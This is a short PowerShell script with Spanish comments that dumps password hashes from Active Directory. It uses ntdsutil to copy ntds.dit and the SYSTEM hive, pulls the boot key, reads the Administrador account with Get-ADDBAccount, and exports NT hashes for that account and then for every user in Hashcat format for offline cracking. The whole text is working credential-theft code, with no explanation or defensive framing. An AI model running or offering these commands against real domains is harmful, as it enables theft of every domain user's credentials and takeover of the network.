#Obtener archivos "ntds.dir" and "SYSTEM" en la carpeta especificada
#ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q

#Obtener BootKey del sistema
$key=Get-BootKey -SystemHiveFilePath "C:\temp\registry\SYSTEM"

#Obtener Información de las contraseñas de un usuario
#Método - Nombre del usuario
Get-ADDBAccount -DatabasePath "C:\temp\Active Directory\ntds.dit" -BootKey $key -SamAccountName "Administrador"

#Exportar "Hash" contraseña del usuario
Get-ADDBAccount -DatabasePath "C:\temp\Active Directory\ntds.dit" -BootKey $key -SamAccountName "Administrador" |
 Format-Custom -View HashcatNT |
 Out-File c:\temp\hashes.txt -Encoding ASCII

#Hash de todos los usuarios
Get-ADDBAccount -DatabasePath "C:\temp\Active Directory\ntds.dit" -BootKey $key -all |
format-custom -view HashcatNT